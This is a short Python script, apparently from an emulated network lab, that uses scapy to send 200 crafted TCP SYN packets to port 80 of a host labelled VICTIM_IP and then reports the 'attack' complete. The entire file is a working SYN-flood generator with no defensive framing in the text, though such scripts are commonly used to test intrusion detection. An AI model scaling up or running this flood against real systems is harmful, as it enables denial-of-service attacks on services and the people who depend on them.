import time, logging
from scapy.all import Ether, IPv6, TCP, sendp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

SRC_MAC = "2a:ac:90:97:e9:78"
DST_MAC = "f2:44:a6:63:0a:48"
VICTIM_IP = "2001:2:1::1"
IFACE = "h1a-eth0"
NUM_PACKETS = 200

print(f"Sending {NUM_PACKETS} SYNs from h1a ({SRC_MAC}) out of {IFACE}...")
for i in range(NUM_PACKETS):
    pkt = Ether(src=SRC_MAC, dst=DST_MAC)/IPv6(dst=VICTIM_IP)/TCP(dport=80, sport=11000+i, flags="S")
    sendp(pkt, iface=IFACE, verbose=0)
    time.sleep(0.01)
print("h1a attack complete.")
